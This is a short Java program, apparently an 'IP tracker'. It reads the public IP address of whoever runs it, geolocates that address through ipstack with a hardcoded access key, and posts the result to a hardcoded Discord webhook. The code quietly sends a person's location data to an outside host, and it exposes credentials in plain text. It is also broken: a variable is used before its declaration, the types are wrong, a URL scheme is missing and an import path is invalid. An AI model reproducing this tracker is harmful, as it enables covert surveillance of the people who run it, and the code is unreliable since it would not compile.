// DiscordIPTracker

package com.discord.tracker;

import java.net.URL;
import java.net.URLConnection;
import java.io.InputStream;
import java.io.Reader;
import java.io.InputStreamReader;

import com.google.json.Gson;

import com.discord.tracker.JsonResult;
import com.discord.tracker.DiscordWebhook;

public class DiscordIPTracker {
    public static void main(String[] args) {
        URLConnection ip_con = new URL("api.ipify.org?format=text");
        String ip_resp = con.getContent().toString();
        String url = "http://api.ipstack.com/";
        String query = "access_key=6707f06b18b682c68ef73f61eda1796f";
        URLConnection con = new URL(url + ip_resp + "?" + query);
        InputStream resp = con.getInputStream();
        Reader read = new InputStreamReader(resp);
        //Now parse each String that comes through...
        JsonResult result = new Gson().fromJson(read);
        DiscordWebhook hook = new DiscordWebhook("https://discordapp.com/api/webhooks/1308104913485828168/k46UoFEOya84w_oUFxfKlmyvltv5hzcXCGXM6WJgPnh4ZIUXiUycEGF1Uz5wuaIMa1fJ");
        hook.setContent(result);
        hook.setUsername("IPTracker");
        hook.setTts(false);
        hook.execute();   
    }
}